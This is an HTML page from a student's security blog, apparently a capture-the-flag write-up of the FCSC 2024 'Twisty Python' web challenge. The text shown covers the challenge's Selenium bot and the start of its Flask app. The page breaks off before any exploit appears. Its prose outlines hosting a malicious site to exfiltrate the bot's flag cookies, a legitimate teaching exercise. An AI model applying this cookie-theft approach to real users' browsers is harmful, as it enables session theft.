@@ -1,0 +1,1919 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Twisty Python [EN]| FCSC 2024</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Twisty&#32;Python&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Twisty&#32;Python&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Twisty&#32;Python&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Twisty&#32;Python&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Here is a complete writeup of the &#39;Twisty Python&#39; web challenge created by Mizu during FCSC 2024" />
+<meta itemprop="description" content="Here is a complete writeup of the &#39;Twisty Python&#39; web challenge created by Mizu during FCSC 2024" />
+<meta property="og:description" content="Here is a complete writeup of the &#39;Twisty Python&#39; web challenge created by Mizu during FCSC 2024" />
+<meta name="twitter:description" content="Here is a complete writeup of the &#39;Twisty Python&#39; web challenge created by Mizu during FCSC 2024" />
+
+
+<base href="//localhost:1313/writeups/twisty-python-fcsc2024-en/" />
+<link rel="canonical" href="//localhost:1313/writeups/twisty-python-fcsc2024-en/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/twisty-python-fcsc2024-en/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/twisty-python-fcsc2024-en/" />
+<meta property="og:url" content="//localhost:1313/writeups/twisty-python-fcsc2024-en/" />
+
+
+<meta property="og:updated_time" content="2024-04-12T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/twisty-python-fcsc2024-en/">Twisty Python [EN]| FCSC 2024</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-04-12T12:00:00Z" class="post-date">
+        April 12, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>17 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-python">
+        <a href="//localhost:1313/tags/python">python</a>
+      </li>
+      
+      <li class="tag-desync">
+        <a href="//localhost:1313/tags/desync">desync</a>
+      </li>
+      
+      <li class="tag-werkzeug">
+        <a href="//localhost:1313/tags/werkzeug">werkzeug</a>
+      </li>
+      
+      <li class="tag-smuggling">
+        <a href="//localhost:1313/tags/smuggling">smuggling</a>
+      </li>
+      
+      <li class="tag-cve">
+        <a href="//localhost:1313/tags/cve">cve</a>
+      </li>
+      
+      <li class="tag-tornado">
+        <a href="//localhost:1313/tags/tornado">tornado</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <hr>
+<h1 id="introduction">Introduction</h1>
+<pre tabindex="0"><code>Venez découvrir la dernière sensation Internet qui promet de battre tous les records ! Dans ce jeu révolutionnaire, vous guiderez un serpent en pleine croissance dans sa quête de pommes. C&#39;est simple mais addictif : dévorez autant de pommes que possible pour étirer votre serpent à des longueurs étonnantes. Êtes-vous prêt à établir de nouveaux records et à devenir une légende dans cette aventure tortueuse ?
+</code></pre><p>The sources for this challenge are provided:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ tree .
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── docker-compose.yml
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── solution
+</span></span><span style="display:flex;"><span>│      └── submit_url.py
+</span></span><span style="display:flex;"><span>└── src
+</span></span><span style="display:flex;"><span>    ├── app.py
+</span></span><span style="display:flex;"><span>    ├── bot.py
+</span></span><span style="display:flex;"><span>    ├── requirements.txt
+</span></span><span style="display:flex;"><span>    ├── static
+</span></span><span style="display:flex;"><span>    │      └── js
+</span></span><span style="display:flex;"><span>    │          └── main.js
+</span></span><span style="display:flex;"><span>    └── templates
+</span></span><span style="display:flex;"><span>        └── index.html
+</span></span></code></pre></div><p>The challenge consists of a single application in 2 parts.<br>
+Let&rsquo;s analyze the source code:</p>
+<p><em>bot.py</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> selenium.webdriver.chrome.options <span style="color:#f92672">import</span> Options
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> selenium.webdriver.chrome.service <span style="color:#f92672">import</span> Service
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> environ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">visit</span>(url):
+</span></span><span style="display:flex;"><span>    chrome_options <span style="color:#f92672">=</span> Options()
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--headless&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--incognito&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--no-sandbox&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--disable-gpu&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--disable-jit&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--disable-wasm&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--disable-dev-shm-usage&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--ignore-certificate-errors&#34;</span>)
+</span></span><span style="display:flex;"><span>    chrome_options<span style="color:#f92672">.</span>binary_location <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/bin/chromium-browser&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    service <span style="color:#f92672">=</span> Service(<span style="color:#e6db74">&#34;/usr/bin/chromedriver&#34;</span>)
+</span></span><span style="display:flex;"><span>    driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome(service<span style="color:#f92672">=</span>service, options<span style="color:#f92672">=</span>chrome_options)
+</span></span><span style="display:flex;"><span>    driver<span style="color:#f92672">.</span>set_page_load_timeout(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    driver<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://127.0.0.1:8000&#34;</span>)
+</span></span><span style="display:flex;"><span>    driver<span style="color:#f92672">.</span>add_cookie({
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;flag_medium&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;value&#34;</span>: environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;FLAG_MEDIUM&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;httpOnly&#34;</span>: <span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;samesite&#34;</span>: <span style="color:#e6db74">&#34;Strict&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;domain&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    driver<span style="color:#f92672">.</span>add_cookie({
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;flag_hard&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;value&#34;</span>: environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;FLAG_HARD&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;httpOnly&#34;</span>: <span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;samesite&#34;</span>: <span style="color:#e6db74">&#34;Strict&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;domain&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        driver<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>: <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    driver<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>The chall implements a selenium bot that will go to a url we give it and then, after waiting 3 seconds, close itself.<br>
+The <em>submit_url.py</em> file is a wrapper for calling the bot without being able to flood the cu CTF instance.</p>
+<p>The first thing we notice is that the two flags are located in the bot&rsquo;s cookies, on the <em>127.0.0.1</em> domain.
+So you&rsquo;ll need to host a malicious site in order to exploit the application and exfiltrate these two flags.<br>
+The first <em>flag</em> is not secure, but the second is, with the attribute: <em>httpOnly</em> set to ``True&rsquo;'.</p>
+<h1 id="discover-the-application">Discover the application.</h1>
+<p>Here&rsquo;s the interesting code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, session, request, Response, render_template, jsonify
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> urandom, environ
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha512
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> bot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Init</span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> urandom(<span style="color:#ae81ff">24</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Utils</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>(session):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;scores&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session:
+</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#34;scores&#34;</span>] <span style="color:#f92672">=</span> []
